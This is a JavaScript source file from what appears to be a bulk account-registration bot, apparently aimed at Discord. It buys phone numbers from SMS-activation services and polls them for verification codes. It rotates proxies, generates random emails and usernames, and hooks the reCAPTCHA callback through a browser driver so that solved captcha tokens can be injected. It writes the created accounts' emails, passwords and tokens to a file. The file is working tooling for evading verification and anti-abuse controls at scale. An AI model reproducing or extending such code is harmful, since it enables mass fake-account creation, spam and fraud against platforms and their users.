function set_ready_number_sms_online(id) {
  return new Promise((fin) => {
    if (!id) return fin({type: false});
    req({
        method: 'GET',
        url: `https://sms-online.pro/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=setStatus&status=1&id=${id}`
      }, (err, response, body) => {
        meAtztGn1pdERnu('B: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'BANNED') return fin({type: false, err: 'ban'});
        if (body == 'BAD_KEY') return fin({type: false, err: 'apikey'});
        if (body == 'ACCESS_CANCEL') return fin({type: false, err: 'cancel'});
        if (body != 'ACCESS_READY') return fin({type: false});
        return fin({type: true});
    })
  });
}

function add_log_get_phone_cheap_sms(n) {
  var html = `${translater(translate[41])}`;
  add_log(html, n);
}

function add_log_of_wr_cheap_sms(n) {
  var html = `<v class="log_error">${translater(translate[42])}</v>`;
  add_log(html, n);
}

function add_log_of_cheap_sms_ban(n) {
  var html = `<v class="log_error">${translater(translate[43])}</v>`;
  add_log(html, n);
}

function add_log_of_cheap_sms_not_bal(n) {
  var html = `<v class="log_error">${translater(translate[44])}</v>`;
  add_log(html, n);
}
function add_log_no_nums_cheap_sms(n) {
  var html = `${translater(translate[45])}`;
  add_log(html, n);
}

function add_log_wrnog_key_cheap_sms(n) {
  var html = `<v class="log_error">${translater(translate[46])}</v>`;
  add_log(html, n);
}

function add_log_dont_get_phone_cheap_sms(n) {
  var html = `<v class="log_error">${translater(translate[40])} cheapsms.pro</v>`;
  add_log(html, n);
}

function get_phone_cheap_sms(n = 1) {
  add_log_get_phone(n, 'cheapsms.pro');
  return new Promise(fin => {
    req({
      method: 'GET',
      url: `https://cheapsms.pro/handler/index?api_key=${apikey_verify_phone}&action=getNumber&service=dc_0`
    }, (err, response, body) => {
      if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
      //meAtztGn1pdERnu('body: '+body);
      if (body == 'NO_NUMBERS') {
        add_log_no_nums_cheap_sms(n);
        return fin({type: false, err: 'no_num'});
      }
      if (body == 'NO_BALANCE') {
        add_log_of_cheap_sms_not_bal(n);
        return fin({type: false, err: 'balance'});
      }
      if (body == 'BANNED') {
        add_log_of_cheap_sms_ban(n);
        return fin({type: false, err: 'ban'});
      }
      if (body == 'BAD_KEY') {
        add_log_wrnog_key_cheap_sms(n);
        return fin({type: false, err: 'apikey'});
      }
      body = body.split(':');
      if (body[0] != 'ACCESS_NUMBER') {
        add_log_dont_get_phone_cheap_sms(n);
        return fin({type: false});
      }
      var id = body[1];
      var number = body[2];
      add_log_suc_get_number(number, n);
      return fin({type: true, number: number, id: id});
    });
  });
}

function add_log_inf_code_phone(n) {
  var html = `${translater(translate[48])}`;
  add_log(html, n);
}

function add_log_status_cancel_cheap(n) {
  var html = `<v class="log_error">${translater(translate[49])}</v>`;
  add_log(html, n);
}

function add_log_status_cancel_smsactivate(n) {
  var html = `<v class="log_error">${translater(translate[50])}</v>`;
  add_log(html, n);
}

function add_log_status_cancel_5sim(n) {
  var html = `<v class="log_error">${translater(translate[167])}</v>`;
  add_log(html, n);
}

function add_log_status_cancel_sms_online(n) {
  var html = `<v class="log_error">${translater(new_translate.sms_on_canc)}</v>`;
  add_log(html, n);
}

function add_log_status_cancel_vak_sms(n) {
  var html = `<v class="log_error">${translater(new_translate.vak_sms_canc)}</v>`;
  add_log(html, n);
}

function add_log_status_cancel(n, service) {
  var html = `<v class="log_error">${translater(new_translate.canc, false, {service: service})}</v>`;
  add_log(html, n);
}

function add_log_dont_have_code_sms(n) {
  var html = `<v class="log_error">${translater(translate[51])}</v>`;
  add_log(html, n);
}

function add_log_success_get_code_sms(code, n) {
  var html = `${translater(translate[52], false, {code: code})}`;
  add_log(html, n);
}

function add_log_dont_have_code_sms_time(n) {
  var html = `<v class="log_error">${translater(translate[53])}</v>`;
  add_log(html, n);
}

function cancel_sms_activate(id) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    req({
        method: 'GET',
        url: `http://sms-activate.ru/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=setStatus&status=8&id=${id}`
      }, (err, response, body) => {
        meAtztGn1pdERnu('B: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        return fin({type: true});
    })
  });
}

function cancel_sms_hub(id) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    req({
        method: 'GET',
        url: `http://smshub.org/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=setStatus&status=8&id=${id}`
      }, (err, response, body) => {
        meAtztGn1pdERnu('B: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        return fin({type: true});
    })
  });
}

function cancel_5sim(id) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    req({
        method: 'GET',
        url: `http://api1.5sim.net/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=setStatus&status=8&id=${id}`
      }, (err, response, body) => {
        meAtztGn1pdERnu('B: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        return fin({type: true});
    })
  });
}

function cancel_sms_online(id) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    req({
        method: 'GET',
        url: `https://sms-online.pro/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=setStatus&status=8&id=${id}`
      }, (err, response, body) => {
        meAtztGn1pdERnu('B: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        return fin({type: true});
    })
  });
}

function get_code_from_phone_cheapsms(id, n = 1) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    add_log_inf_code_phone(n);
    var i = 0;
    var time = setInterval(() => {
      add_log_inf_code_phone(n);
      i++;
      if (i > 20) {
        cancel_sms_activate(id);
        add_log_dont_have_code_sms_time(n);
        meAtztGn1pdERnu('TIMEMEMEM!!!');
        clearInterval(time);
        return fin({type: false});
      }
      req({
        method: 'GET',
        url: `https://cheapsms.pro/handler/index?api_key=${apikey_verify_phone}&action=getStatus&id=${id}`
      }, (err, response, body) => {
        //meAtztGn1pdERnu('body: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'BANNED') {
          add_log_of_cheap(n, 'cheapsms.pro');
          clearInterval(time);
          return fin({type: false, err: 'ban'});
        }
        if (body == 'BAD_KEY') {
          add_log_wrnog_key(n, 'cheapsms.pro');
          clearInterval(time);
          return fin({type: false, err: 'apikey'});
        }
        if (body == 'STATUS_CANCEL') {
          add_log_status_cancel(n, 'cheapsms.pro');
          clearInterval(time);
          return fin({type: false, err: 'cancel'});
        }
        if (body.indexOf('STATUS_OK') < 0) return false;
        clearInterval(time);
        body = body.split(':');
        var code = body[1];
        code = code.replace(' ', '');
        code = code.replace(' ', '');
        code = code.replace(' ', '');
        add_log_success_get_code_sms(code, n);
        return fin({type: true, code: code});
      })
    }, 7.5 * 1000);
  });
}

function get_code_from_phone_sms_activate(id, n = 1) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    var i = 0;
    var time = setInterval(() => {
      add_log_inf_code_phone(n);
      i++;
      if (i > 9) {
        set_finish_sms_activate(id);
        add_log_dont_have_code_sms_time(n);
        meAtztGn1pdERnu('TIMEMEMEM!!!');
        clearInterval(time);
        return fin({type: false});
      }
      req({
        method: 'GET',
        url: `http://sms-activate.ru/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getStatus&id=${id}`
      }, (err, response, body) => {
        //meAtztGn1pdERnu('body: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'BANNED') {
          add_log_of_ban(n, 'sms-activate.ru');
          clearInterval(time);
          return fin({type: false, err: 'ban'});
        }
        if (body == 'BAD_KEY') {
          add_log_wrnog_key(n, 'sms-activate.ru');
          clearInterval(time);
          return fin({type: false, err: 'apikey'});
        }
        if (body == 'STATUS_CANCEL') {
          add_log_status_cancel(n, 'sms-activate.ru');
          clearInterval(time);
          return fin({type: false, err: 'cancel'});
        }
        if (body.indexOf('STATUS_OK') < 0) return false;
        clearInterval(time);
        if (inArray(get_api_code_country(), [46, 34, 44])) {
          body = body.replace('STATUS_OK:', '');
          var code = body.replace(/\D+/g,"");
        } else {
          body = body.split(':');
          var code = body[1];
        }
        add_log_success_get_code_sms(code, n);
        set_finish_sms_activate(id);
        return fin({type: true, code: code});
      })
    }, 7.5 * 1000);
  });
}

function get_code_from_phone_sms_hub(id, n = 1) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    var i = 0;
    var time = setInterval(() => {
      add_log_inf_code_phone(n);
      i++;
      if (i > 9) {
        set_finish_sms_activate(id);
        add_log_dont_have_code_sms_time(n);
        meAtztGn1pdERnu('TIMEMEMEM!!!');
        clearInterval(time);
        return fin({type: false});
      }
      req({
        method: 'GET',
        url: `http://smshub.org/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getStatus&id=${id}`
      }, (err, response, body) => {
        //meAtztGn1pdERnu('body: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'BANNED') {
          add_log_of_ban(n, 'smshub.org');
          clearInterval(time);
          return fin({type: false, err: 'ban'});
        }
        if (body == 'BAD_KEY') {
          add_log_wrnog_key(n, 'smshub.org');
          clearInterval(time);
          return fin({type: false, err: 'apikey'});
        }
        if (body == 'STATUS_CANCEL') {
          add_log_status_cancel(n, 'smshub.org');
          clearInterval(time);
          return fin({type: false, err: 'cancel'});
        }
        if (body.indexOf('STATUS_OK') < 0) return false;
        clearInterval(time);
        if (inArray(get_api_code_country(), [46, 34, 44])) {
          body = body.replace('STATUS_OK:', '');
          var code = body.replace(/\D+/g,"");
        } else {
          body = body.split(':');
          var code = body[1];
        }
        add_log_success_get_code_sms(code, n);
        set_finish_sms_activate(id);
        return fin({type: true, code: code});
      })
    }, 7.5 * 1000);
  });
}

function get_code_from_phone_simsms(id, n = 1) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    var i = 0;
    var time = setInterval(() => {
      add_log_inf_code_phone(n);
      i++;
      if (i > 9) {
        finish_simsms(id);
        add_log_dont_have_code_sms_time(n);
        meAtztGn1pdERnu('TIMEMEMEM!!!');
        clearInterval(time);
        return fin({type: false});
      }
      req({
        method: 'GET',
        url: `http://simsms.org/priemnik.php?metod=get_sms&id=${id}&country=${get_api_code_country()}&service=opt45&apikey=${apikey_verify_phone}`
      }, (err, response, body) => {
        ////meAtztGn1pdERnu('body: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'API KEY не получен!') {
          add_log_wrnog_key(n, 'simsms.org');
          return fin({type: false, err: 'apikey'});
        }
        body = JSON.parse(body);
        if (body.response != '1') return;
        clearInterval(time);
        var code = body.sms;
        add_log_success_get_code_sms(code, n);
        finish_simsms(id);
        return fin({type: true, code: code});
      })
    }, 7.5 * 1000);
  });
}

function get_code_from_phone_smspva(id, n = 1) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    var i = 0;
    var time = setInterval(() => {
      add_log_inf_code_phone(n);
      i++;
      if (i > 9) {
        finish_smspva(id);
        add_log_dont_have_code_sms_time(n);
        meAtztGn1pdERnu('TIMEMEMEM!!!'); // Are you ok?
        clearInterval(time);
        return fin({type: false});
      }
      req({
        method: 'GET',
        url: `http://smspva.com/priemnik.php?metod=get_sms&id=${id}&country=${get_api_code_country()}&service=opt45&apikey=${apikey_verify_phone}`
      }, (err, response, body) => {
        //meAtztGn1pdERnu('body: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'API KEY not received!') {
          add_log_wrnog_key(n, 'smspva.com');
          return fin({type: false, err: 'apikey'});
        }
        body = JSON.parse(body);
        if (body.response != '1') return;
        clearInterval(time);
        var code = body.sms;
        add_log_success_get_code_sms(code, n);
        finish_smspva(id);
        return fin({type: true, code: code});
      })
    }, 7.5 * 1000);
  });
}

function finish_simsms(id) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    req({
      method: 'GET',
      url: `http://simsms.org/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=denial&id=${id}&country=${get_api_code_country()}&service=opt45`
    }, (err, response, body) => {})
  });
}

function finish_smspva(id) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    req({
      method: 'GET',
      url: `http://smspva.com/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=denial&id=${id}&country=${get_api_code_country()}&service=opt45`
    }, (err, response, body) => {})
  });
}

function get_code_from_phone_vak_sms(id, n = 1) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    var i = 0;
    var time = setInterval(() => {
      add_log_inf_code_phone(n);
      i++;
      if (i > 9) {
        set_finish_vak_sms(id);
        add_log_dont_have_code_sms_time(n);
        meAtztGn1pdERnu('TIMEMEMEM!!!');
        clearInterval(time);
        return fin({type: false});
      }
      req({
        method: 'GET',
        url: `https://vak-sms.com/api/getSmsCode/?apiKey=${apikey_verify_phone}&idNum=${id}`
      }, (err, response, body) => {
        //meAtztGn1pdERnu('body: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        body = JSON.parse(body);
        if (!body.smsCode) return false;
        clearInterval(time);
        var code = body.smsCode;
        add_log_success_get_code_sms(code, n);
        set_finish_vak_sms(id);
        return fin({type: true, code: code});
      })
    }, 7.5 * 1000);
  });
}

function set_finish_vak_sms(id) {
  req({
    url: `https://vak-sms.com/api/setStatus/?apiKey=${apikey_verify_phone}&status=end&idNum=${id}`,
    method: 'GET'
  }, () => {});
}

function get_code_from_phone_5sim(id, n = 1) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    var i = 0;
    var time = setInterval(() => {
      add_log_inf_code_phone(n);
      i++;
      if (i > 9) {
        set_finish_5sim(id);
        add_log_dont_have_code_sms_time(n);
        meAtztGn1pdERnu('TIMEMEMEM!!!');
        clearInterval(time);
        return fin({type: false});
      }
      req({
        method: 'GET',
        url: `http://api1.5sim.net/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getStatus&id=${id}`
      }, (err, response, body) => {
        meAtztGn1pdERnu(body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'BANNED') {
          add_log_of_ban(n, '5sim.net');
          clearInterval(time);
          return fin({type: false, err: 'ban'});
        }
        if (body == 'BAD_KEY') {
          add_log_wrnog_key(n, '5sim.net');
          clearInterval(time);
          return fin({type: false, err: 'apikey'});
        }
        if (body == 'STATUS_CANCEL') {
          add_log_status_cancel(n, '5sim.net');
          clearInterval(time);
          return fin({type: false, err: 'cancel'});
        }
        if (body.indexOf('STATUS_OK') < 0) return false;
        clearInterval(time);
        body = body.split(':');
        var code = body[1];
        add_log_success_get_code_sms(code, n);
        set_finish_5sim(id);
        return fin({type: true, code: code});
      })
    }, 7.5 * 1000);
  });
}

function get_code_from_phone_sms_online(id, n = 1) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    var i = 0;
    var time = setInterval(() => {
      add_log_inf_code_phone(n);
      i++;
      if (i > 9) {
        set_finish_sms_online(id);
        add_log_dont_have_code_sms_time(n);
        meAtztGn1pdERnu('TIMEMEMEM!!!');
        clearInterval(time);
        return fin({type: false});
      }
      req({
        method: 'GET',
        url: `https://sms-online.pro/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getStatus&id=${id}`
      }, (err, response, body) => {
        meAtztGn1pdERnu(body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'BANNED') {
          add_log_of_ban(n, 'sms-online.pro');
          clearInterval(time);
          return fin({type: false, err: 'ban'});
        }
        if (body == 'BAD_KEY') {
          add_log_wrnog_key(n, 'sms-online.pro');
          clearInterval(time);
          return fin({type: false, err: 'apikey'});
        }
        if (body == 'STATUS_CANCEL') {
          add_log_status_cancel_sms_online(n);
          clearInterval(time);
          return fin({type: false, err: 'cancel'});
        }
        if (body == 'NO_ACTIVATION') {
          add_log_dont_have_code_sms(n);
          clearInterval(time);
          return fin({type: false, err: 'not_found'});
        }
        if (body.indexOf('STATUS_OK') < 0) return false;
        clearInterval(time);
        body = body.split(':');
        var code = body[1];
        add_log_success_get_code_sms(code, n);
        set_finish_sms_online(id);
        return fin({type: true, code: code});
      })
    }, 7.5 * 1000);
  });
}

function get_code_from_search() {
  var c = country;
  var a;
  if (c == 'ru') {
    a = 'Russia'
  } else if (c == 'ua') {
    a = 'Ukraine'
  } else {
    a = 'azakhstan'
  }
  return a;
}

function add_log_verfy_phone(n) {
  var html = `${translater(translate[54])}`;
  add_log(html, n);
}

function checker_proxys(proxys) {
  return new Promise(fin => {
    var limit = 1500;
    var good_proxys = [];
    proxys.forEach((proxy, ind, arr) => {
      setTimeout(async () => {
        var check = await check_proxy(proxy);
        if (check) good_proxys.push(proxy);
        if (ind == arr.length - 1) return fin({type: true, data: good_proxys});
      }, 3 * ind);
    })
  });
}

var check_ver_phone = [];

function delete_email(email) {
  var last_emails = store.get('last_emails');
  if (!store.has('last_emails') || last_emails.length <= 0) return {type: false, error: 'not_found'};
}

function get_email(verfy_mails = false) {
  if (verfy_mails && typeOfEmailVerifications == 'temp') {
    var email = get_temp_email();
    if (!email) return {type: false, error: 'dont_have_temp_mail'};
    return {type: true, email: email};
    // if (!defImapUser || !defImapUser.user) return {type: false, error: 'wrong_getting_gmail_email'};
    // var email = defImapUser.user;
    // email = `${email.substr(0, email.indexOf('@'))}+${md5(uuid())}${email.substr(email.indexOf('@'))}`;
    // if (!email) return {type: false, error: 'dont_have_temp_mail'};
    // return {type: true, email};
  }
  if ($('#random_emails_enabler').prop('checked')) {
    var domain = domains[Math.floor(Math.random() * ((domains.length - 1) + 1 - 0))];
    var email = `${generatePassowrd(10 + Math.floor(Math.random() * (35 + 1 - 10)))}@${domain}`;
    return {type: true, email: generateEmail()};
  }
  var last_emails = store.get('last_emails');
  if (!store.has('last_emails') || last_emails.length <= 0) return {type: false, error: 'not_found'};
  var emails = last_emails;
  var getter = () => {    
    var doneEmail = false;
    for (var i = 0; i < emails.length; i++) {
      var email = emails[Math.floor(Math.random() * emails.length)];
      if (!checkGetEmail[email]) {
        doneEmail = email;
        checkGetEmail[email] = true;
        break;
      }
    }
    if (!doneEmail) doneEmail = emails[Math.floor(Math.random() * emails.length)];
    return doneEmail;
  }
  return {type: true, email: getter()};
  // var success_emailers = store.get('success_emailers');
  // for (var i = 0; i < 100; i++) {
  //   email = emails[Math.floor(Math.random() * emails.length)];
  //   if (store.has('success_emailers') && success_emailers.length > 0) {
  //     if (success_emailers.indexOf(email) < 0) return {type: true, email: email};
  //   } else {
  //     return {type: true, email: email};
  //   }
  // }
}

function get_username() {
  if (!$('#random_usernames_enabler').prop('checked')) if (!store.has('last_usernames') || store.get('last_usernames').length <= 0) return {type: false, error: 'not_found'};
  if ($('#random_usernames_enabler').prop('checked')) {
    return {type: true, username: generateName()};
  } else {
    if (last_data_usernames) {
      var usernames = last_data_usernames;
    } else {
      var usernames = store.get('last_usernames');
      last_data_usernames = usernames;
    }
    var username;
    username = usernames[Math.floor(Math.random() * usernames.length)];
    return {type: true, username: username};
    //for (var i = 0; i < 100; i++) {
      // if (store.has('success_usernames') && store.get('success_usernames').indexOf(username) < 0) {
      //   return {type: true, username: username};
      // } else {
      //   return {type: true, username: username};
      // }
    //}
  }
}

function get_proxy() {
  if (!store.has('last_proxys') || store.get('last_proxys').length <= 0) return {type: false, error: 'not_found'};
  var proxys = store.get('last_proxys')
  var proxy;
  var check = false;
  for (var i = 0; i < 100; i++) {
    proxy = proxys[Math.floor(Math.random() * proxys.length)];
    if (!limit_proxy[proxy]) {
      check = true;
      return {type: true, proxy: proxy};
    }
  }
  if (!check) return {type: false};
}

function add_log_reger(email, pass, proxy = false, n) {
  if (!proxy) proxy = translater(translate[55]);
  var html = `${translater(translate[56], false, {email: email, pass: pass, proxy: proxy})}`;
  add_log(html, n);
}

function add_log_push_form(n) {
  var html = `Заполняем форму данных аккаунта`;
  add_log(html, n);
}

function add_log_send_form(n) {
  var html = `Отправляем форму...`;
  add_log(html, n);
}

var limit_proxy = [];

function add_proxy_limit(proxy) {
  limit_proxy[proxy] = true;
  setTimeout(() => {
    delete limit_proxy[proxy];
  }, 15 * 1000);
}

function add_log_limited(n) {
  var html = `${translater(translate[57])}`;
  add_log(html, n);
}

function add_log_res_cap(n) {
  var html = `${translater(translate[58])}`;
  add_log(html, n);
}

function add_log_error_message(n) {
  var html = `${translater(translate[59])}`;
  add_log(html, n);
}

function get_callback_function_grecap(driver) {
  return new Promise(fin => {
    driver.executeScript(`var success = false;
                          Object.keys(___grecaptcha_cfg.clients[0]).reverse().forEach(e => {
                              meAtztGn1pdERnu('e: '+e)
                              Object.keys(___grecaptcha_cfg.clients[0][e]).forEach(a => {
                                meAtztGn1pdERnu('a: '+a)
                                if (!___grecaptcha_cfg.clients[0][e][a])  return false;
                                Object.keys(___grecaptcha_cfg.clients[0][e][a]).forEach(o => {
                                  meAtztGn1pdERnu('o: '+o)
                                  if (o == 'callback') success = "___grecaptcha_cfg.clients[0]['"+e+"']['"+a+"'].callback";
                                })
                              })
                            })
                            return success;`).then((check) => {
      if (!check) return fin({type: false, err: 1});
      return fin({type: true, code: check});
    }, (e) => {
      meAtztGn1pdERnu('e: '+e);
      return fin({type: false, err: 6});
    })
  });
}

var last_success_cap = [];

function starter_getting_recap_tokens(potok_number = 1) {
  return false;
  if (last_count_potok_finish == last_count_potok) return false;
  meAtztGn1pdERnu('starter_getting_recap_tokens()!');
  if (type_captcha == 1) {
    res_cap(c.data_key, c.register, potok_number).then((cap) => {
    setTimeout(() => {
      starter_getting_recap_tokens(potok_number)
    }, 200);
      if (!cap.type) return cap_ready.emit('ready', {type: false});
      cap_ready.emit('ready', {
        type: true,
        token: cap.token
      });
      last_success_cap.push(cap.token);
    }, () => {
      cap_ready.emit('ready', {type: false});
      setTimeout(() => {
        starter_getting_recap_tokens(potok_number)
      }, 200);
    });
  } else {
    res_anticap(c.data_key, c.register, potok_number).then((cap) => {
      setTimeout(() => {
        starter_getting_recap_tokens(potok_number)
      }, 200);
      if (!cap.type) return cap_ready.emit('ready', {type: false});
      cap_ready.emit('ready', {
        type: true,
        token: cap.token
      })
      last_success_cap.push(cap.token);
    }, () => {
      cap_ready.emit('ready', {type: false});
      setTimeout(() => {
        starter_getting_recap_tokens(potok_number)
      }, 200);
    });
  }
}

var check_ready_cap = [];

function getRandomInt(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function get(url, driver) {
  return new Promise((fin) => {
    if (!url || !driver) return fin(false);
    driver.get(url).then(() => {
      return fin(true);
    }, (r) => {
      //alert(r);
      return fin(false);
    });
  });
}

function update_proxy_count() {
  $('#count-of-proxy-regs').html(store.get('last_proxys').length + ' '+translater(translate[60]));
}

function block_proxy_add(proxy) {
  if (!store.has('last_proxys')) return false;
  var new_p = [];
  var proxys = store.get('last_proxys');
  proxys.forEach((e, ind, arr) => {
    if (e != proxy) new_p.push(e);
    if (ind == arr.length) {
      store.set('last_proxys', new_p);
      update_proxy_count();
    }
  });
}

$('body').on('change', '#save_only_tokens_enabler', function () {
  update_tmp('save_only_tokens_enabler', $(this).prop('checked'));
});

$('body').on('change', '#save_tokens_enabler', function () {
  update_tmp('save_tokens_enabler', $(this).prop('checked'));
  if ($(this).prop('checked')) {
    $('#save_only_tokens_enabler').prop('checked', false);
    $('#block-save_only_tokens').addClass('active');
  } else {
    $('#save_only_tokens_enabler').prop('checked', false);
    $('#block-save_only_tokens').removeClass('active');
  }
});

$('body').on('change', '#save_usernames_enabler', function () {
  update_tmp('save_usernames_enabler', $(this).prop('checked'));
});

$('body').on('change', '#dark_theme_enabler', function () {
  var val = $(this).prop('checked');
  if (val) {
    $('head').append(css_dark);
    $('body').addClass('dark');
  } else {
    $('body').removeClass('dark');
    $('#dtssheet').remove();
  }
  update_tmp('dark_theme_enabler', val);
});

function encode(file) {
  var stream = fs.readFileSync(file);
  return new Buffer(stream).toString('base64');
}

function stringToArray(s) {
  const retVal = [];
  for (const ch of s) {
    retVal.push(ch);
  }
  return retVal;
}

function set_finish_sms_activate(id) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    req({
        method: 'GET',
        url: `http://sms-activate.ru/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=setStatus&status=6&id=${id}`
      }, (err, response, body) => {
        meAtztGn1pdERnu('B: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'BANNED') return fin({type: false, err: 'ban'});
        if (body == 'BAD_KEY') return fin({type: false, err: 'apikey'});
        if (body == 'ACCESS_CANCEL') return fin({type: false, err: 'cancel'});
        if (body != 'ACCESS_ACTIVATION') return fin({type: false});
        return fin({type: true});
    })
  });
}

function set_finish_sms_hub(id) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    req({
        method: 'GET',
        url: `http://smshub.org/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=setStatus&status=6&id=${id}`
      }, (err, response, body) => {
        meAtztGn1pdERnu('B: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'BANNED') return fin({type: false, err: 'ban'});
        if (body == 'BAD_KEY') return fin({type: false, err: 'apikey'});
        if (body == 'ACCESS_CANCEL') return fin({type: false, err: 'cancel'});
        if (body != 'ACCESS_ACTIVATION') return fin({type: false});
        return fin({type: true});
    })
  });
}

function set_finish_5sim(id) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    req({
        method: 'GET',
        url: `http://api1.5sim.net/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=setStatus&status=6&id=${id}`
      }, (err, response, body) => {
        meAtztGn1pdERnu(body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'BANNED') return fin({type: false, err: 'ban'});
        if (body == 'BAD_KEY') return fin({type: false, err: 'apikey'});
        if (body == 'ACCESS_CANCEL') return fin({type: false, err: 'cancel'});
        if (body != 'ACCESS_ACTIVATION') return fin({type: false});
        return fin({type: true});
    })
  });
}

function set_finish_sms_online(id) {
  return new Promise(fin => {
    if (!id) return fin({type: false});
    req({
        method: 'GET',
        url: `https://sms-online.pro/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=setStatus&status=6&id=${id}`
      }, (err, response, body) => {
        meAtztGn1pdERnu(body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'BANNED') return fin({type: false, err: 'ban'});
        if (body == 'BAD_KEY') return fin({type: false, err: 'apikey'});
        if (body == 'ACCESS_CANCEL') return fin({type: false, err: 'cancel'});
        if (body != 'ACCESS_ACTIVATION') return fin({type: false});
        return fin({type: true});
    })
  });
}

function update_count_regs() {
  setTimeout(() => {
    var block = $('#count-reg-accounts');
    var count = accounts.length + NumberEnd(accounts.length, translater(translate[61]));
    if (!block.hasClass('active')) block.addClass('active');
    block.css('opacity', '0');
    setTimeout(() => {
      block.html(count);
      setTimeout(() => {
        block.css('opacity', '');
      }, 50)
    }, 200);
  }, 500);
}

function add_log_getting_username() {
  var html = `${translater(translate[62])}`;
  add_log(html, 1)
}

function add_log_bad_get_username() {
  var html = `${translater(translate[63])}`;
  add_log(html, 1)
}

function add_log_success_username() {
  var html = `${translater(translate[64])}`;
  add_log(html, 1)
}

var last_count_success_accs = [];

function save_success_acc() {
  last_count_success_accs.push(new Date().getTime());
  var data = localStorage['statics'];
  if (!data) {
    data = {success_regs: 0};
  } else {
    data = JSON.parse(data);
  }
  data['success_regs']++;
  localStorage.setItem('statics', JSON.stringify(data));
}

function save_bad_acc() {
  var data = localStorage['statics'];
  if (!data) {
    data = {bad_regs: 0};
  } else {
    data = JSON.parse(data);
  }
  data['bad_regs']++;
  localStorage.setItem('statics', JSON.stringify(data));
}

function updater_reg_statics() {
  var last_count = 0;
  setInterval(() => {
    if (last_count_potok_finish >= last_count_potok) {
      $('#reg-speed-accs').removeClass('active');
      $('#all-count-regs').removeClass('active');
      return false;
    }
    $('#reg-speed-accs').addClass('active');
    $('#all-count-regs').addClass('active');
    var now = new Date().getTime();
    var time = now - (60 * 1000);
    var speed = 0;
    last_count_success_accs.forEach((e) => {
      if (e >= time) speed++;
    })
    $('#reg-speed-accs y').html(speed);
    var all_count = localStorage['statics'];
    if (!all_count) return;
    all_count = JSON.parse(all_count);
    if (!all_count.success_regs) all_count.success_regs = 0;
    all_count = `${all_count.success_regs}${NumberEnd(all_count.success_regs, translater(translate[61]))}`;
    $('#all-count-regs y').html(all_count);
  }, 2.5 * 1000);
}

var lastExportFileData = '';

function success_reg_acc(acc, n = 3) {
  save_success_acc();
  var html = `${translater(translate[65], false, {email: acc.email, pass: acc.pass})}`;
  add_log(html, n);
  update_count_regs();  
  if ($('#save_accs_enabler').prop('checked')) {
    var file = tmp_data['last_export_file'];
    setTimeout(() => {
      //if (err) return noty('error', translater(translate[66]));
      var data = lastExportFileData ? lastExportFileData : '';
      if ($('#save_only_tokens_enabler').prop('checked')) {
        accounts.forEach(e => {
          var acc = e;
          data += `${acc.token}\r\n`;
        })
        fs.writeFileSync(file, data);
      } else {
        if (save_usernames) {
          add_log_getting_username();
          get_username_user(acc.token, acc.proxy, acc.user_agent).then((r) => {            
            fs.readFile(file, 'utf8', function (err, data) {
              if (!r.type) {
                add_log_bad_get_username();
                if (save_tokens) {
                  data += `${acc.email}:${acc.pass}:${acc.token}\n`;
                } else {
                  data += `${acc.email}:${acc.pass}\n`;
                }
                fs.writeFileSync(file, data);
              } else {
                add_log_success_username();
                if (save_tokens) {
                  data += `${acc.email}:${acc.pass}:${acc.token}:${r.username}\r\n`;
                } else {
                  data += `${acc.email}:${acc.pass}:${r.username}\r\n`;
                }
                fs.writeFileSync(file, data);
              }
            })
            if (tmp_data['save_discrim_accs_enabler'] && r.type) {
              var discrim = tmp_data['discrims-for-save'].split(',');
              var discrims = [];
              discrim.forEach(e => {
